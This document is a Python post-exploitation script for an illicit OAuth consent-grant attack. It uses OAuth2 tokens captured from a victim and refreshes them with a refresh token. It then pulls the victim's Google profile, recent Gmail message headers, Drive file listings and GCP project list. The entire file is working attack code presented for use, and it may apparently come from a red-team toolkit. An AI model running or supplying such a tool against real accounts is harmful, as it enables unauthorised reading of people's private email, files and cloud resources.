#!/usr/bin/env python3
"""
Illicit Consent Grant -- Exfiltration via Google APIs
====================================================
Uses captured OAuth2 tokens to query Google REST APIs.
Supports automatic access_token refresh via refresh_token.

Usage:
    python3 exfil_tokens.py --token-file tokens.json --action list-emails
    python3 exfil_tokens.py --token-file tokens.json --action list-drive
    python3 exfil_tokens.py --token-file tokens.json --action userinfo
    python3 exfil_tokens.py --token-file tokens.json --action refresh
"""

import os
import sys
import json
import argparse
import urllib.request
import urllib.parse
import urllib.error

TOKENS_FILE = "tokens.json"

# =============================================================================
# HTTP UTILITIES
# =============================================================================

def api_get(url: str, access_token: str) -> dict:
    """Perform an authenticated GET request on a Google API."""
    req = urllib.request.Request(
        url,
        headers={"Authorization": f"Bearer {access_token}"},
        method="GET",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return {"status": resp.status, "data": json.loads(resp.read().decode("utf-8"))}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8")
        return {"status": e.code, "error": body}
    except Exception as e:
        return {"status": 0, "error": str(e)}


def refresh_access_token(refresh_token: str, client_id: str, client_secret: str) -> dict:
    """Refresh the access_token using the refresh_token."""
    data = urllib.parse.urlencode({
        "refresh_token": refresh_token,
        "client_id":     client_id,
        "client_secret": client_secret,
        "grant_type":    "refresh_token",
    }).encode("utf-8")

    req = urllib.request.Request(
        "https://oauth2.googleapis.com/token",
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )

    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        return {"error": e.read().decode("utf-8")}


# =============================================================================
# ACTIONS
# =============================================================================

def action_userinfo(access_token: str):
    """Retrieve basic user information."""
    print("\n[+] Userinfo (openid + email + profile)")
    print("-" * 60)
    result = api_get("https://openidconnect.googleapis.com/v1/userinfo", access_token)
    if result.get("error"):
        print(f"[!] Error: {result['error']}")
        return
    data = result["data"]
    print(f"  Email        : {data.get('email', 'N/A')}")
    print(f"  Name         : {data.get('name', 'N/A')}")
    print(f"  Given name   : {data.get('given_name', 'N/A')}")
    print(f"  Family name  : {data.get('family_name', 'N/A')}")
    print(f"  Picture      : {data.get('picture', 'N/A')}")
    print(f"  HD (domain)  : {data.get('hd', 'N/A')}")
    print(f"  Sub (ID)     : {data.get('sub', 'N/A')}")


def action_list_emails(access_token: str, max_results: int = 10):
    """List recent emails via Gmail API."""
    print("\n[+] Gmail API -- Recent emails")
    print("-" * 60)
    result = api_get(
        f"https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults={max_results}",
        access_token,
    )
    if result.get("error"):
        print(f"[!] Error: {result['error']}")
        if result.get("status") == 403:
            print("    The 'gmail.readonly' scope was not granted.")
        return

    messages = result["data"].get("messages", [])
    if not messages:
        print("  No emails found.")
        return

    for msg in messages[:max_results]:
        msg_id = msg.get("id", "N/A")
        detail = api_get(
            f"https://gmail.googleapis.com/gmail/v1/users/me/messages/{msg_id}?format=metadata&metadataHeaders=Subject&metadataHeaders=From&metadataHeaders=Date",
            access_token,
        )
        if detail.get("error"):
            print(f"  [{msg_id}] Read error")
            continue

        headers = {h["name"]: h["value"] for h in detail["data"].get("payload", {}).get("headers", [])}
        subject = headers.get("Subject", "(no subject)")
        sender = headers.get("From", "N/A")
        date = headers.get("Date", "N/A")
        print(f"  [{msg_id[:16]}...] {date[:20]} | {sender[:35]:35} | {subject[:40]}")


def action_list_drive(access_token: str, max_results: int = 10):
    """List Drive files via Drive API."""
    print("\n[+] Drive API -- Recent files")
    print("-" * 60)
    result = api_get(
        f"https://www.googleapis.com/drive/v3/files?pageSize={max_results}&fields=files(id,name,mimeType,modifiedTime,owners)",
        access_token,
    )
    if result.get("error"):
        print(f"[!] Error: {result['error']}")
        if result.get("status") == 403:
            print("    The 'drive.readonly' scope was not granted.")
        return

    files = result["data"].get("files", [])
    if not files:
        print("  No files found.")
        return

    for f in files:
        name = f.get("name", "N/A")
        mime = f.get("mimeType", "N/A").split(".")[-1]
        modified = f.get("modifiedTime", "N/A")[:10]
        owner = f.get("owners", [{}])[0].get("displayName", "N/A")
        print(f"  [{mime:15}] {modified} | {owner[:20]:20} | {name[:40]}")


def action_list_gcp_projects(access_token: str):
    """List GCP projects via Cloud Resource Manager API."""
    print("\n[+] Cloud Resource Manager API -- GCP Projects")
    print("-" * 60)
    result = api_get(
        "https://cloudresourcemanager.googleapis.com/v1/projects",
        access_token,
    )
    if result.get("error"):
        print(f"[!] Error: {result['error']}")
        if result.get("status") == 403:
            print("    The 'cloud-platform' scope was not granted.")
        return

    projects = result["data"].get("projects", [])
    if not projects:
        print("  No projects found.")
        return

    for p in projects:
        pid = p.get("projectId", "N/A")
        name = p.get("name", "N/A")
        status = p.get("lifecycleState", "N/A")
        print(f"  [{status:12}] {pid:30} | {name}")


def action_refresh(tokens: dict):
    """Refresh the access_token and update the file."""
    print("\n[+] Refreshing access_token")
    print("-" * 60)
    refresh_token = tokens.get("refresh_token")
    if not refresh_token:
        print("[!] No refresh_token available.")
        print("    Consent must have been done with 'prompt=consent' and 'access_type=offline'.")
        return

    meta = tokens.get("_metadata", {})
    client_id = meta.get("client_id", "")
    client_secret = meta.get("client_secret", "")

    if not client_secret:
        client_secret = input("Enter CLIENT_SECRET: ").strip()

    result = refresh_access_token(refresh_token, client_id, client_secret)
    if result.get("error"):
        print(f"[!] Error: {result['error']}")
        return

    tokens["access_token"] = result["access_token"]
    tokens["token_type"] = result.get("token_type", "Bearer")
    if "expires_in" in result:
        tokens["expires_in"] = result["expires_in"]

    with open(TOKENS_FILE, "w") as f:
        json.dump(tokens, f, indent=2)

    print(f"[+] New access_token: {result['access_token'][:40]}...")
    print(f"[+] File {TOKENS_FILE} updated.")
    return result["access_token"]


# =============================================================================
# MAIN
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Exfiltration via Google APIs using OAuth2 tokens"
    )
    parser.add_argument(
        "--token-file", "-t",
        default=TOKENS_FILE,
        help="JSON file containing the tokens (default: tokens.json)",
    )
    parser.add_argument(
        "--action", "-a",
        required=True,
        choices=["userinfo", "list-emails", "list-drive", "list-gcp", "refresh", "all"],
        help="Action to perform",
    )
    parser.add_argument(
        "--limit", "-l",
        type=int,
        default=10,
        help="Max number of results (default: 10)",
    )
    args = parser.parse_args()

    if not os.path.exists(args.token_file):
        print(f"[!] File not found: {args.token_file}")
        print("    Run oauth_app.py first to capture tokens.")
        sys.exit(1)

    with open(args.token_file) as f:
        tokens = json.load(f)

    access_token = tokens.get("access_token", "")
    if not access_token:
        print("[!] No access_token in file.")
        sys.exit(1)

    print("=" * 70)
    print("  EXFILTRATION -- Google APIs with OAuth2 tokens")
    print("=" * 70)
    print(f"  Token file : {args.token_file}")
    print(f"  Scopes     : {tokens.get('_metadata', {}).get('scopes_requested', 'N/A')}")
    print("=" * 70)

    actions = {
        "userinfo":    lambda: action_userinfo(access_token),
        "list-emails": lambda: action_list_emails(access_token, args.limit),
        "list-drive":  lambda: action_list_drive(access_token, args.limit),
        "list-gcp":    lambda: action_list_gcp_projects(access_token),
        "refresh":     lambda: action_refresh(tokens),
    }

    if args.action == "all":
        for name, fn in actions.items():
            if name != "refresh":
                fn()
    else:
        actions[args.action]()

    print("\n[+] Done.")


if __name__ == "__main__":
    main()
